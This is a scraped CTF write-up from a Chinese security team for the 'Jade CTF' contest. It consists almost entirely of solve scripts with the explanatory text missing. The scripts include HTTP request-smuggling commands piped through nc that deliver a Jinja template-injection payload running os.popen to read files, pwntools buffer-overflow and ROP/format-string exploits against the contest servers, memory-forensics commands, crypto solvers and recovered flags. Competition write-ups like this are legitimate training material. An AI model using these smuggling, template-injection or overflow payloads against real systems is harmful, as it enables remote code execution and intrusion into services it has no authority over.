# Jade CTF WP

> 原文: https://www.ctfiot.com/68004.html
> ID: 68004

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：8900

阅读时长：约23分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

ctf.wgpsec.org

前言

比赛信息

后记

CTF战队正在招新！如果你也对CTF拥有非常浓厚的兴趣，欢迎加入我们！

c2VuZCBtYWlsIHRvIG1hdGNoQHdncHNlYy5vcmcgfg==

作者

CTF战队

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
import requests

url = "http://34.76.206.46:
10008/?page="
flag = ""
for i in range(1,999999):
    r1 = requests.get(url+str(i))
    r2 = requests.get(url+str(i))
    r3 = requests.get(url + str(i))
    if(r1.text == r2.text == r3.text):
        flag = flag + r3.text
        print(i)
        print(flag)
import requests

url = "http://34.76.206.46:
10008/?page="
flag = ""

def fib(n):
    a, b = 1, 1
    for i in range(n - 1):
        a, b = b, a + b
    return a

for i in range(2,100):
    r1 = requests.get(url+str(fib(i)))
    flag = flag + r1.text
    print(flag)
echo -en "GET / HTTP/1.1rnHost: 34.76.206.46:
10014rnContent-Length: 85rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=n00b HTTP/1.1rnHost: localhostrnContent-Length: 35rnrnGET / HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:
10014rnContent-Length: 96rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b9*9%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
{{lipsum.__globals__['os'].popen('cat flag.txt').read()}}
echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:
10014rnContent-Length: 222rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%6c%73%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
echo -en "GET /cat HTTP/1.1rnHost: 34.76.206.46:
10014rnContent-Length: 252rnSec-Websocket-Key1: xrnrnxxxxxxxxGET /internal?username=%7b%7b%6c%69%70%73%75%6d%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%5b%27%6f%73%27%5d%2e%70%6f%70%65%6e%28%27%63%61%74%20%66%6c%61%67%2e%74%78%74%27%29%2e%72%65%61%64%28%29%7d%7d HTTP/1.1rnHost: localhostrnContent-Length: 36rnrnGET /c HTTP/1.1rnHost: localhostrnrn" | nc 34.76.206.46 10014
python vol.py -f ./workspace/sandeep.raw 
--profile=Win7SP1x64 dumpfiles 
-Q 0x000000007ed6c9c0 -D ./workspace/
python vol.py -f ./workspace/sandeep.raw 
--profile=Win7SP1x64 
dumpfiles -Q 0x000000007dec85f0 
-D ./workspace/
From - Thu, 20 Oct 2022 05:34:22 GMT
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00800000
Message-ID: <80466942-4a56-c2e7-1666-501f6fb92eab@gmail.com>
Date: Wed, 19 Oct 2022 22:34:18 -0700
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:
102.0) Gecko/20100101
 Thunderbird/102.3.3
Content-Language: en-US
To: pearl8stoner@gmail.com
From: Jade Stoner <jade8stoner@gmail.com>
Subject: Thank You
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit

Thanks for inviting me bro.I will be there in time.

From - Thu, 20 Oct 2022 05:44:13 GMT
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00800000
Message-ID: <3075f4bc-8f46-efaf-029c-1e88c0c878a7@gmail.com>
Date: Wed, 19 Oct 2022 22:44:09 -0700
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:
102.0) Gecko/20100101
 Thunderbird/102.3.3
Content-Language: en-US
To: pearl8stoner@gmail.com
From: Jade Stoner <jade8stoner@gmail.com>
Subject: Important
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit

Hi bro!!

Here is the code to contact Sandeep:

NWIyYjdmMDUyMzczMDU2MTFmMzM2ODIxNGQzYTYwMWQ0MzI1NzQwZg==

I hope you are ready for the party and don't forget to decode it

From - Thu, 20 Oct 2022 05:44:50 GMT
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00800000
Message-ID: <885b4ae7-3092-c18e-9fa0-c71cea850a93@gmail.com>
Date: Wed, 19 Oct 2022 22:44:47 -0700
MIME-Version: 1.0
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:
102.0) Gecko/20100101
 Thunderbird/102.3.3
Content-Language: en-US
To: pearl8stoner@gmail.com
From: Jade Stoner <jade8stoner@gmail.com>
Subject: hint
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

In case, you are having any trouble to decode it.Here's your hint.

int main() {
   char flag[] = "XXXXXXXXXX";
   int len = strlen(flag);
   for (int i = 0; i < len; i++) {
     if (i > 0) flag[i] ^= flag[i-1];
     flag[i] ^= flag[i] >> 4;
     flag[i] ^= flag[i] >> 3;
     flag[i] ^= flag[i] >> 2;
     flag[i] ^= flag[i] >> 1;
     printf("%02x", (unsigned char)flag[i]);
   }
   return 0;
}
import base64
import binascii
import string

res = b"NWIyYjdmMDUyMzczMDU2MTFmMzM2ODIxNGQzYTYwMWQ0MzI1NzQwZg=="
res = base64.b64decode(res)
out = binascii.unhexlify(res).decode()

def check_res(ccflag):
    cflag = ccflag.copy()
    for i in range(0, len(cflag)):
        cflag[i] = chr(cflag[i])

    print(''.join(cflag))

    for i in range(0, len(cflag)):
        cflag[i] = ord(cflag[i])

    digest = ""
    for i in range(0, len(cflag)):
        if (i > 0):
            cflag[i] ^= cflag[i-1]
        cflag[i] ^= cflag[i] >> 4
        cflag[i] ^= cflag[i] >> 3
        cflag[i] ^= cflag[i] >> 2
        cflag[i] ^= cflag[i] >> 1
        digest += "%02x" % cflag[i]

    print("digest =", digest)

def isprint(num):
    return 32 <= ord(num) <= 126

def dfs(gflag, idx):
    if idx == len(out):
        check_res(gflag)
        return
    for j in range(0x20, 126):
        tmp = j
        if idx > 0:
            tmp ^= ord(out[idx - 1])
        tmp ^= tmp >> 4
        tmp ^= tmp >> 3
        tmp ^= tmp >> 2
        tmp ^= tmp >> 1
        if tmp == ord(out[idx]):
            print(idx, "out[i] =", out[idx], hex(ord(out[idx])))

            if not isprint(chr(j)):
                return
            eflag = gflag.copy()
            eflag[idx] = j
            dfs(eflag, idx + 1)

def main(flag00):
    flag = [0] * len(out)
    for i in range(0, len(flag00)):
        flag[i] = ord(flag00[i])
    dfs(flag, len(flag00))

# main
main("y")
jctf{p34rl_1s_look1ng_f0r_Sandeep}
import base64
from Crypto.Cipher import AES, DES
with open('./file.fun', 'rb') as f:
    c = f.read()
key = base64.b64decode("OoIsAwwF32cICQoLDA0ODe==")
iv = [0,1,0,3,5,3,0,1,0,0,2,0,6,7,6,0]
iv = bytes(iv)
# print(iv)
cipher = AES.new(key, DES.MODE_CBC, iv)
m = cipher.decrypt(c)
print(m.decode()) #jadeCTF{j1gs4w_puzzl3_1s_n0t_s0_34sy}
with open('flag.txt','wb') as f:
    f.write(m)
jadeCTF{cryptoisfunorisit}
from pwn import *
p = remote('34.76.206.46',10002)
# p = process('./babypwn')
py = 'a'*520 + p64(0x0000000000400746)
p.sendline(py)
p.interactive()
jadeCTF{buff3r_0v3rfl0ws_4r3_d4ng3r0u5}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch='amd64', endian='el', os='linux')
# context.terminal = ['tmux','splitw','-h', '-l', '100']
context.log_level = 'debug'

if debug == 1:
    p = process(['./chall'])
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('34.76.206.46', 10005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./chall', checksec=False)

pd = b"binLep"
p.sendlineafter(b'Please enter your name: ', pd)
p.sendlineafter(b'Please choose what you would like to do: ', b'2')

pd = b''
pd += b'a' * 0x78
pd += p64(next(elf.search(asm("ret"))))
pd += p64(elf.sym['you_cant_see_me'])
pd += p64(next(elf.search(asm("ret"))))
pd += p64(elf.sym['you_cant_see_me'])
pd += p64(elf.sym['win'])
p.sendlineafter(b'Enter the name of the lucky one ;): ', pd)

p.sendlineafter(b'Wh0 are you?n', b"%17$p.tmp")
p.recvuntil(b'Nice name it 1s: ')

# gdb.attach(p, "b *0x400A01nc")
stack = int(p.recvuntil(b'.tmp', drop=True), 16) + 0x0c
success("stack = " + hex(stack))

pd = b'aaa%8$n'
pd = pd.ljust(0x10, b"x00")
pd += p64(stack)
p.sendlineafter(b'Wh0 are you?n', pd)
p.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/1-1667054773.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1667054773.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1667054774.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1667054778.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1667054779.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1667054781.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1667054782.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1667054783.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/0-1667054783.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/1-1667054784.png)